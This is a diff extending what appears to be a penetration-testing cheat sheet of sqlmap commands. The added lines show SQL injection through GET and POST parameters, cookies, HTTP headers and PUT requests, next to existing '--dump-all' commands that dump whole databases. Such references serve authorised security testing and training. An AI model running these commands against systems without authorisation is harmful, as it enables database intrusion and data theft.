@@ -195,3 +195,27 @@ Using POST based Method
 sqlmap -r req.txt -D <database_name> --dump-all
 
 sqlmap -r req.txt-p  -D <database_name> --dump-all
+
+## GET Request Injection
+sqlmap -u "http://example.com/?id=1" -p id
+sqlmap -u "http://example.com/?id=*" -p id
+
+## POST Request Injection
+sqlmap -u "http://example.com" --data "username=*&password=*"
+
+# SQLmap POST Injection
+sqlmap -u "http(s)://<ip_addr>:<port>/<directory>" --method POST --data "field1=*&field2=*&field3=*" -p "field3"
+
+## Header & Othe HTTP Method Injection
+
+# Inside cookie
+sqlmap -u "http://example.com" --cookie "mycookies=*"
+
+# Inside some header
+sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
+sqlmap -u "http://example.com" --headers="referer:*"
+
+# PUT Method
+sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
+
+#The injection is located at the '*'
